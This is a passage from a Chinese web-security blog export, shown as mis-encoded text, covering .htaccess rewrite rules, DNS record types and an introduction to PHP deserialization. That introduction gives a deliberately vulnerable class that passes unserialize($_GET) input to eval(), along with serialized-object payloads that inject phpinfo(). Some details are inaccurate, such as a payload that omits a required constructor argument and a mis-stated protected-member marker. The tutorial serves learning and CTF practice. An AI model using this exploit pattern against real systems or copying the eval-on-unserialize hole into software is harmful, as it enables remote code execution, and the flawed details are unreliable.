ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œé‡Œé¢å¡«å¥½è®¾è®¡å¥½çš„ä»£ç </p><p>å¦‚æœä¸æ˜¯å®å¡”ï¼Œå°±æ˜¯æ‰‹åŠ¨åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»º.htaccessæ–‡ä»¶ï¼Œç„¶åæŠŠä»£ç åŠ è¿›å»</p><p>æ³¨æ„apacheå’Œnginxä¸¤ä¸ªæœåŠ¡å™¨å¯¹åº”çš„ä»£ç å’Œé…ç½®æ–¹æ³•ä¸åŒè¦æ³¨æ„åŒºåˆ†ï¼›</p><h4 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h4><p>æ•°æ®åº“æ‰‹åŠ¨æ›´æ”¹ï¼Œéœ€è¦åœ¨wp-config-sample.phpæ–‡ä»¶ä¸­çš„è´¦å·å¯†ç å’Œæ•°æ®åº“åå­—æ”¹äº†ï¼Œç„¶åæ–‡ä»¶åæ”¹æˆwp-config.phpã€‚æ³¨æ„è¿™ä¸ªæ—¶å€™æ‰“å¼€wordpressä¼šæç¤ºæ•°æ®åº“æŸåæˆ–è€…å‡ºé”™ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨å®å¡”ä¸­é‡å¯mysqlã€‚å¦‚æœæ˜¯å·²ç»åˆ›å»ºå¥½çš„wordpresså‡ºç°æ•°æ®åº“æŸåçš„æƒ…å†µé¦–å…ˆæŠŠæ•°æ®åº“å¤‡ä»½å†é‡å¯æˆ–è€…å…¶ä»–æ“ä½œ</p><h1 id="è¡¥å……çŸ¥è¯†"><a href="#è¡¥å……çŸ¥è¯†" class="headerlink" title="è¡¥å……çŸ¥è¯†"></a>è¡¥å……çŸ¥è¯†</h1><h4 id="ä¼ªé™æ€-1"><a href="#ä¼ªé™æ€-1" class="headerlink" title="ä¼ªé™æ€"></a>ä¼ªé™æ€</h4><p>å‰ç½®çŸ¥è¯†ï¼š</p><blockquote><p>thinkPHP -&gt; ä¸€ä¸ªè½»é‡çº§PHPæ¡†æ¶</p><p>CMS -&gt; å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆå¸®åŠ©ä½¿ç”¨è€…ä»¥â€œç³»ç»ŸåŒ–â€çš„æ–¹å¼â€œç®¡ç†â€ç½‘ç«™çš„å†…å®¹ï¼‰</p><p>apacheï¼ŒNginx -&gt; webæœåŠ¡å™¨è½¯ä»¶</p></blockquote><h5 id="ä»€ä¹ˆæ˜¯ä¼ªé™æ€"><a href="#ä»€ä¹ˆæ˜¯ä¼ªé™æ€" class="headerlink" title="ä»€ä¹ˆæ˜¯ä¼ªé™æ€"></a>ä»€ä¹ˆæ˜¯ä¼ªé™æ€</h5><p>ä¼ªé™æ€æ˜¯ä»‹äºåŠ¨æ€å’Œé™æ€ä¹‹é—´çš„ä¸€ç§å¤„ç†æ–¹å¼ã€‚å› ä¸ºåŠ¨æ€æ˜¯ç°å®çš„éœ€æ±‚ï¼Œè€ŒåŠ¨æ€åˆå¯¹æœç´¢çš„æŠ“å–ä¸åˆ©ï¼ˆå› ä¸ºä¼šäº§ç”Ÿå¤§é‡ä¸åŒURLå¯¹åº”ä¸€ä¸ªé¡µé¢ï¼‰ï¼Œæ‰€ä»¥åœ¨æŠ€æœ¯ä¸Šé‡‡ç”¨äº†ä¸€ç§æ–¹æ³•å°±æ˜¯æŠŠåŠ¨æ€URLæŒ‰ç…§<strong>æ­£åˆ™å…³ç³»è¿›è¡Œæ˜ å°„</strong>ï¼Œæ˜ å°„æˆç±»ä¼¼é™æ€çš„åœ°å€ï¼Œå› æ­¤è¢«ç§°ä¹‹ä¼ªé™æ€ã€‚ï¼ˆä¼ªé™æ€å®è´¨è¿˜æ˜¯åŠ¨æ€çš„ï¼‰</p><h5 id="apacheä¼ªé™æ€è®¾ç½®"><a href="#apacheä¼ªé™æ€è®¾ç½®" class="headerlink" title="apacheä¼ªé™æ€è®¾ç½®"></a>apacheä¼ªé™æ€è®¾ç½®</h5><ul><li>mod_rewrite</li></ul><p>1ã€mod_rewrite ç®€ä»‹å’Œé…ç½® Rewirteä¸»è¦çš„åŠŸèƒ½å°±æ˜¯å®ç°URLçš„è·³è½¬å’Œéšè—çœŸå®åœ°å€ï¼ŒåŸºäºPerlè¯­è¨€çš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒã€‚å¹³æ—¶å¸®åŠ©æˆ‘ä»¬å®ç°æ‹Ÿé™æ€ï¼Œæ‹Ÿç›®å½•ï¼ŒåŸŸåè·³è½¬ï¼Œé˜²æ­¢ç›—é“¾ç­‰</p><p>2ã€mod_rewrite è§„åˆ™çš„ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Â RewriteEngine on </span><br><span class="line">Â RewriteCond %&#123;HTTP_HOST&#125; !^www.php100.com [NC] </span><br><span class="line">Â â€‹</span><br><span class="line">Â RewriteRule ^/(.*) http://www.php100.com/ [L]</span><br><span class="line">Â â€‹</span><br><span class="line">Â RewriteEngine on </span><br><span class="line">Â RewriteRule ^/test([0-9]*).html$ /test.php?id=$1 </span><br><span class="line">Â RewriteRule ^/new([0-9]*)/$ /new.php?id=$1 [R]</span><br></pre></td></tr></table></figure><p>3ã€mod_rewrite è§„åˆ™ä¿®æ­£ç¬¦</p><ol><li>R å¼ºåˆ¶å¤–éƒ¨é‡å®šå‘ 2) F ç¦ç”¨URL,è¿”å›403HTTPçŠ¶æ€ç ã€‚ 3) G å¼ºåˆ¶URLä¸ºGONEï¼Œè¿”å›410HTTPçŠ¶æ€ç ã€‚ 4) P å¼ºåˆ¶ä½¿ç”¨ä»£ç†è½¬å‘ã€‚ 5) L è¡¨æ˜å½“å‰è§„åˆ™æ˜¯æœ€åä¸€æ¡è§„åˆ™ï¼Œåœæ­¢åˆ†æä»¥åè§„åˆ™çš„é‡å†™ã€‚ 6) N é‡æ–°ä»ç¬¬ä¸€æ¡è§„åˆ™å¼€å§‹è¿è¡Œé‡å†™è¿‡ç¨‹ã€‚ 7) C ä¸ä¸‹ä¸€æ¡è§„åˆ™å…³è”8) T&#x3D;MIME-type(force MIME type) å¼ºåˆ¶MIMEç±»å‹ 9) NS åªç”¨äºä¸æ˜¯å†…éƒ¨å­è¯·æ±‚ 10) NC ä¸åŒºåˆ†å¤§å°å†™ 11) QSA è¿½åŠ è¯·æ±‚å­—ç¬¦ä¸² 12) NE ä¸åœ¨è¾“å‡ºè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ \%3d$1 ç­‰ä»·äº &#x3D;$1</li></ol><ul><li>.htaccess</li></ul><p>(2) .htaccess ç‰ˆæœ¬ä¼ªé™æ€è§„åˆ™(è¿è¡Œç¯å¢ƒæ˜¯Apacheï¼Œæˆ–è€…æ˜¯IIS ,ISAPI Rewrite ç‰ˆæœ¬ä¸º3.0æˆ–è€…ä»¥ä¸Š)</p><p>apacheåªèƒ½ç”¨.htaccessæ¥åšä¼ªé™æ€ï¼Œè€Œä¸ºä»€ä¹ˆIIS çš„ç¯å¢ƒä¹Ÿè¦ç”¨åˆ°.htaccesså‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºISAPI Rewrite ç‰ˆæœ¬ä¸º3.0æˆ–è€…ä»¥ä¸Šåªæ”¯æŒ.htaccessçš„æ ¼å¼ã€‚</p><p>å¦‚æœæ˜¯è€æ‰‹ï¼Œå¯ä»¥ç›´æ¥ç”¨ISAPI Rewrite ç‰ˆæœ¬ä¸º3.0æŠŠhttpd.iniè½¬æ¢æˆ.htaccessæ ¼å¼çš„ã€‚</p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•æ–°å»ºç«‹ä¸€ä¸ª.htaccessçš„æ–‡ä»¶ï¼ŒæŠŠä»¥ä¸‹ä»£ç æ”¾è¿›å»å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line"></span><br><span class="line">RewriteBase /</span><br><span class="line"></span><br><span class="line">RewriteRule ^book/([0-9]+)\.html$ modules/article/articleinfo.php?id=$1</span><br><span class="line"></span><br><span class="line">RewriteRule ^list/([0-9]+)_([0-9]+)/$ modules/article/index.php?page=$2&amp;class=$1</span><br><span class="line"></span><br><span class="line">RewriteRule ^top/([a-z]+)_([0-9]+)/$ modules/article/toplist.php?page=$2&amp;sort=$1</span><br></pre></td></tr></table></figure><h4 id="åŸŸåè§£æ-1"><a href="#åŸŸåè§£æ-1" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h4><h5 id="ä»€ä¹ˆæ˜¯DNSåŸŸåè§£æï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯DNSåŸŸåè§£æï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯DNSåŸŸåè§£æï¼Ÿ"></a>ä»€ä¹ˆæ˜¯DNSåŸŸåè§£æï¼Ÿ</h5><blockquote><p>IPåœ°å€æ˜¯äº’è”ç½‘ä¸Šè®¡ç®—æœºå”¯ä¸€çš„é€»è¾‘åœ°å€ï¼Œé€šè¿‡IPåœ°å€å®ç°ä¸åŒè®¡ç®—æœºä¹‹é—´çš„ç›¸äº’é€šä¿¡ï¼Œæ¯å°è”ç½‘è®¡ç®—æœºéƒ½éœ€è¦é€šè¿‡IPåœ°å€æ¥äº’ç›¸è”ç³»å’Œåˆ†åˆ«ã€‚</p><p>ä½†ç”±äºIPåœ°å€æ˜¯ç”±ä¸€ä¸²å®¹æ˜“æ··æ·†çš„æ•°å­—ä¸²æ„æˆï¼Œäººä»¬å¾ˆéš¾è®°å¿†æ‰€æœ‰è®¡ç®—æœºçš„IPåœ°å€ï¼Œè¿™æ ·å¯¹äºæˆ‘ä»¬æ—¥å¸¸å·¥ä½œç”Ÿæ´»è®¿é—®ä¸åŒç½‘ç«™æ˜¯å¾ˆå›°éš¾çš„ã€‚åŸºäºè¿™ç§èƒŒæ™¯ï¼Œäººä»¬åœ¨IPåœ°å€çš„åŸºç¡€ä¸Šåˆå‘å±•å‡ºäº†ä¸€ç§æ›´æ˜“è¯†åˆ«çš„ç¬¦å·åŒ–æ ‡è¯†ï¼Œè¿™ç§æ ‡è¯†ç”±äººä»¬è‡ªè¡Œé€‰æ‹©çš„å­—æ¯å’Œæ•°å­—æ„æˆï¼Œç›¸æ¯”IPåœ°å€æ›´æ˜“è¢«è¯†åˆ«å’Œè®°å¿†ï¼Œé€æ¸ä»£æ›¿IPåœ°å€æˆä¸ºäº’è”ç½‘ç”¨æˆ·è¿›è¡Œè®¿é—®äº’è”çš„ä¸»è¦å…¥å£ã€‚è¿™ç§ç¬¦å·åŒ–æ ‡è¯†å°±æ˜¯åŸŸåã€‚</p></blockquote><p><img src="http://psych.green/wp-content/uploads/2023/07/06f23ef6c8db46e59049279a0ce9cd20-1024x545.png"></p><p>å…¶ä¸­å‰ä¸¤ä¸ªè¿‡ç¨‹æ˜¯åœ¨ç”µè„‘ä¸»æœºå®Œæˆï¼Œåé¢å…«ä¸ªåˆ©ç”¨<strong>åŸŸåè§£ææœåŠ¡å™¨</strong></p><p><img src="http://psych.green/wp-content/uploads/2023/07/image-20230301215933118.png"></p><p>æˆ‘ä»¬è´­ä¹°åŸŸåä¹‹ååŸŸåæœåŠ¡å•†ä¸€èˆ¬éƒ½ä¼š<strong>é€DNSè§£ææœåŠ¡</strong>ï¼Œåœ¨è§£æåŸŸåä¹‹å‰æˆ‘ä»¬è¦çŸ¥é“è‡ªå·±çš„æœåŠ¡å™¨çš„åœ°å€ã€‚æˆ‘ä»¬è´­ä¹°çš„ä¸»æœº&#x2F;æœåŠ¡å™¨éƒ½ä¼šæœ‰IPåœ°å€æˆ–è€…CANMEåœ°å€ã€‚</p><p>æœ¬åœ°è§£ææœåŠ¡å™¨è§£æä¸å‡ºæ¥å°±ä¸€æ­¥ä¸€æ­¥å‘ä¸Šç”³è¯·ç›´åˆ°è§£æå‡ºæ¥ä¸ºæ­¢</p><h5 id="åŸŸåè§£æåˆ†ç±»"><a href="#åŸŸåè§£æåˆ†ç±»" class="headerlink" title="åŸŸåè§£æåˆ†ç±»"></a>åŸŸåè§£æåˆ†ç±»</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¦åˆ†ä¸ºAè®°å½•ã€MXè®°å½•ã€CNAMEè®°å½•ã€NSè®°å½•å’ŒTXTè®°å½•ï¼š</span><br></pre></td></tr></table></figure><p>1ã€Aè®°å½•</p><p>Aä»£è¡¨Addressï¼Œç”¨æ¥æŒ‡å®šåŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå¦‚å°†item.taobao.comæŒ‡å®šåˆ°115.238.23.xxxï¼Œå°†switch.taobao.comæŒ‡å®šåˆ°121.14.24.xxxã€‚Aè®°å½•å¯ä»¥å°†å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPåœ°å€ï¼Œä½†æ˜¯ä¸èƒ½å°†ä¸€ä¸ªåŸŸåè§£æåˆ°å¤šä¸ªIPåœ°å€</p><p>2ã€MXè®°å½•</p><p>Mail Exchangeï¼Œå°±æ˜¯å¯ä»¥å°†æŸä¸ªåŸŸåä¸‹çš„é‚®ä»¶æœåŠ¡å™¨æŒ‡å‘è‡ªå·±çš„Mail Serverï¼Œå¦‚taobao.comåŸŸåçš„Aè®°å½•IPåœ°å€æ˜¯115.238.25.xxxï¼Œå¦‚æœå°†MXè®°å½•è®¾ç½®ä¸º115.238.25.xxxï¼Œå³<a href="mailto:xxx@taobao.com">xxx@taobao.com</a>çš„é‚®ä»¶è·¯ç”±ï¼ŒDNSä¼šå°†é‚®ä»¶å‘é€åˆ°115.238.25.xxxæ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œè€Œæ­£å¸¸é€šè¿‡Webè¯·æ±‚çš„è¯ä»ç„¶è§£æåˆ°Aè®°å½•çš„IPåœ°å€</p><p>3ã€CNAMEè®°å½•</p><p>Canonical Nameï¼Œå³åˆ«åè§£æã€‚æ‰€è°“åˆ«åè§£æå°±æ˜¯å¯ä»¥ä¸ºä¸€ä¸ªåŸŸåè®¾ç½®ä¸€ä¸ªæˆ–è€…å¤šä¸ªåˆ«åï¼Œå¦‚å°†aaa.comè§£æåˆ°bbb.netã€å°†ccc.comä¹Ÿè§£æåˆ°bbb.netï¼Œå…¶ä¸­bbb.netåˆ†åˆ«æ˜¯aaa.comå’Œccc.comçš„åˆ«å</p><p>4ã€NSè®°å½•</p><p>ä¸ºæŸä¸ªåŸŸåæŒ‡å®šDNSè§£ææœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªåŸŸåç”±æŒ‡å®šçš„IPåœ°å€çš„DNSæœåŠ¡å™¨å–è§£æ</p><p>5ã€TXTè®°å½•</p><p>ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®è¯´æ˜ï¼Œå¦‚å¯ä»¥ä¸ºddd.netè®¾ç½®TXTè®°å½•ä¸ºâ€è¿™æ˜¯XXXçš„åšå®¢â€è¿™æ ·çš„è¯´æ˜</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> webåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–</title>
      <link href="/2023/07/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h5 id="PHPååºåˆ—åŒ–åŸç†"><a href="#PHPååºåˆ—åŒ–åŸç†" class="headerlink" title="PHPååºåˆ—åŒ–åŸç†"></a>PHPååºåˆ—åŒ–åŸç†</h5><p>åºåˆ—åŒ–å…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œè‡ªç„¶ï¼Œé€†å‘çš„è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¦ååºåˆ—åŒ–å‘¢ï¼Ÿå¯ä»¥è¯´ï¼Œåºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥ä¼ è¾“ï¼Œå‚¨å­˜çš„æ•°æ®ã€‚</p><hr><h6 id="ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ"></a>ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ</h6><p>1.<strong>å­˜å‚¨éœ€æ±‚</strong></p><p>â€œæ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚â€ åœ¨ç¨‹åºæ‰§è¡Œç»“æŸæ—¶ï¼Œå†…å­˜æ•°æ®ä¾¿ä¼šç«‹å³é”€æ¯ï¼Œå˜é‡æ‰€å‚¨å­˜çš„æ•°æ®ä¾¿æ˜¯å†…å­˜æ•°æ®ï¼Œè€Œæ–‡ä»¶ã€æ•°æ®åº“æ˜¯â€œæŒä¹…æ•°æ®â€ï¼Œå› æ­¤PHPåºåˆ—åŒ–å°±æ˜¯å°†å†…å­˜çš„å˜é‡æ•°æ®â€œä¿å­˜â€åˆ°æ–‡ä»¶ä¸­çš„æŒä¹…æ•°æ®çš„è¿‡ç¨‹ã€‚</p><p>2.<strong>ä¼ è¾“éœ€æ±‚</strong></p><p>åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œjsonæ ¼å¼ï¼Œè¿™å°±æ˜¯ä¸€ç§åºåˆ—åŒ–ï¼Œæœ‰å¯èƒ½å°±æ˜¯é€šè¿‡arrayåºåˆ—åŒ–è€Œæ¥çš„ã€‚è€Œååºåˆ—åŒ–å°±æ˜¯æŠŠé‚£ä¸²å¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²å†å˜å›å¯¹è±¡ã€‚</p><p>è¿™æ ·å°±è®©å¯¹è±¡èƒ½å¤Ÿä»¥å­—èŠ‚æµçš„å½¢å¼ä¼ è¾“ã€‚</p><hr><h6 id="åŸºæœ¬å‡½æ•°å’Œæ–¹æ³•"><a href="#åŸºæœ¬å‡½æ•°å’Œæ–¹æ³•" class="headerlink" title="åŸºæœ¬å‡½æ•°å’Œæ–¹æ³•"></a>åŸºæœ¬å‡½æ•°å’Œæ–¹æ³•</h6><p>å¯¹äºPHPï¼Œè¿›è¡Œååºåˆ—åŒ–æ—¶ä¸»è¦ç”¨åˆ°äº†è¿™ä¸¤ç§å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â serialize Â  Â  Â -- å°†å¯¹è±¡æ ¼å¼åŒ–æˆæœ‰åºçš„å­—ç¬¦ä¸²</span><br><span class="line">Â unserialize Â  Â -- å°†å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„å¯¹è±¡</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–çš„ç›®çš„æ˜¯æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èˆ¬ç”¨åšç¼“å­˜ï¼Œæ¯”å¦‚sessionç¼“å­˜ï¼Œcookieç­‰ã€‚</p><p>é™¤äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œè¿˜éœ€è¦äº†è§£PHPä¸­å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Â __construct() å½“åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘ï¼Œä¸€èˆ¬ç”¨äºåˆå§‹åŒ–å¯¹è±¡ï¼Œå¯¹å˜é‡èµ‹åˆå€¼</span><br><span class="line">Â __sleep() ä½¿ç”¨serialize()æ—¶è‡ªåŠ¨è§¦å‘</span><br><span class="line">Â __wakeup() ä½¿ç”¨unserialize()æ—¶è‡ªåŠ¨è§¦å‘</span><br><span class="line">Â __destruct() å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">Â __toString() å½“ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼Œä¸ä»…æ˜¯echo</span><br><span class="line">Â __invoke() å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘</span><br><span class="line">Â __call() åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">Â __callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">Â __get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">Â __set() ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">Â __isset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">Â __unset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><h6 id="æ–¹æ³•å’Œå±æ€§"><a href="#æ–¹æ³•å’Œå±æ€§" class="headerlink" title="æ–¹æ³•å’Œå±æ€§"></a>æ–¹æ³•å’Œå±æ€§</h6><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒæŠŠå¯¹è±¡åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ä¸­å¹¶ä¸èƒ½çœ‹åˆ°ä»»ä½•ä¸€ä¸ªæ–¹æ³•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â åºåˆ—åŒ–åªåºåˆ—åŒ–ä»–çš„å±æ€§ï¼Œä¸åºåˆ—åŒ–æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨åˆ©ç”¨åºåˆ—åŒ–æ”»å‡»çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä¾æ‰˜ç±»å±æ€§è¿›è¡Œæ”»å‡»ã€‚</p><p>å…³äºå±æ€§ï¼ŒPHPè®¾ç½®äº†ä¸‰ç§ä¸åŒçš„å˜é‡<code>public,private,protected</code>ï¼Œä»–ä»¬ä¹‹é—´å­˜åœ¨ä¸€äº›æ ‡è®°ä¸Šçš„åŒºåˆ«</p><ul><li>publicæ— æ ‡è®°ï¼Œå˜é‡åä¸å˜ï¼Œé•¿åº¦ä¸å˜: <code>s:2:&quot;op&quot;;i:2;</code></li><li>protectedåœ¨å˜é‡åå‰æ·»åŠ æ ‡è®°\00_\00ï¼Œé•¿åº¦+3: `s:5:â€\00_\00opâ€;i:2;`</li><li>privateåœ¨å˜é‡åå‰æ·»åŠ æ ‡è®°\00(classname)\00ï¼Œé•¿åº¦+2+ç±»åé•¿åº¦: <code>s:17:&quot;\00FileHandler_Z\00op&quot;;i:2;</code></li></ul><p>è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹è¦æ³¨æ„ï¼Œprivateå˜é‡å’Œprotectedå˜é‡å’Œpublicå˜é‡ä¸ä¸€æ ·ï¼Œä»–ä»¬æ˜¯å—åˆ°ä¿æŠ¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åˆ›å»ºåºåˆ—åŒ–å¯¹å¯¹è±¡çš„æ—¶å€™ä¸èƒ½å†å·²ç»åˆ›é€ å‡ºå¯¹è±¡äº†å†æ¥è¿›è¡Œèµ‹å€¼ï¼Œè¿™æ˜¯æ²¡æœ‰æƒé™çš„ã€‚çœ‹ä¸‹é¢çš„payloadå¸®åŠ©ç†è§£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Â é¢˜ç›®ï¼š</span><br><span class="line">Â  Â  Â class Test&#123;</span><br><span class="line">Â  Â  Â private $test;</span><br><span class="line">Â  Â  Â public function __construct($test)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;test = $test;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __destruct()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â eval($this-&gt;test);</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;unserialize($_GET[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure><p><strong>æ­£ç¡®payload</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Â #payload 1</span><br><span class="line">Â class Test Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â private $test;</span><br><span class="line">Â  Â  Â public function __construct($test)&#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;test = $test;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $a = new Test(&#x27;phpinfo();&#x27;);</span><br><span class="line">Â echo urlencode(serialize($a));</span><br><span class="line">Â â€‹</span><br><span class="line">Â #payload 2</span><br><span class="line">Â class Test Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â private $test;</span><br><span class="line">Â  Â  Â public function __construct($test)&#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;test = &#x27;phpinfo()&#x27;;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $a = new Test();</span><br><span class="line">Â echo urlencode(serialize($a));</span><br><span class="line">Â â€‹</span><br><span class="line">Â #payload 3</span><br><span class="line">Â class Test Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  </span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â private $test=&#x27;phpinfo();&#x27;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $a = new Test();</span><br><span class="line">Â echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p><strong>é”™è¯¯payload</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 